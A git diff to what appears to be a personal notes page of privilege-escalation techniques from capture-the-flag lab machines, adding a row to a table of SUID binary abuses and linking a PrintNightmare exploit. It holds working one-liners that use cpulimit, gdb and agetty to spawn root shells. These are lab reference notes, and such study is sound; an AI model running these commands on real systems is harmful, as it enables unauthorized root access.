@@ -7,6 +7,7 @@ order: 4
 The below is a modification from [here](https://github.com/Ignitetechnologies/Privilege-Escalation) !
 
 <a name="table-of-contents"></a>
+
 Table of Contents LINUX
 ==========================
 
@@ -43,7 +44,8 @@ Table of Contents WINDOWS
 |No.| Machine Name                 |SUID Bit| Reference | Method |
 |-------|------------------------------|-------|-------|--------------------------------------------------------|
 |1|[ShellDredd #1 Hannah](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/)| cpulimit|[Reference](https://am-a-circle.github.io/posts/ONSYSTEM-HANNAH/)  | cpulimit -l 50 -f cp /bin/bash /tmp/bash <br> cpulimit -l 50 -f chmod +s /tmp/bash <br>  /tmp/bash -p|
-|2|[hackmyvm : connection](https://hackmyvm.eu/machines/machine.php?vm=Connection)| gdb |[Reference](https://am-a-circle.github.io/posts/connection/)  | gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit |
+|2|[hackmyvm : connection](https://hackmyvm.eu/machines/machine.php?vm=Connection)| gdb |[Reference](https://am-a-circle.github.io/posts/connection/)  | gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit |a
+|3|[hackmyvm : soul](https://hackmyvm.eu/machines/machine.php?vm=soul)| agetty |Reference |/sbin/agetty -o -p -l /bin/bash -a root tty|
 
 
 
@@ -99,4 +101,3 @@ Table of Contents WINDOWS
 |No.| Machine Name   | service exploit  |
 |-------|-----------------|--------|
 |1. | driver | [spoolsv](https://github.com/calebstewart/CVE-2021-1675) |
-
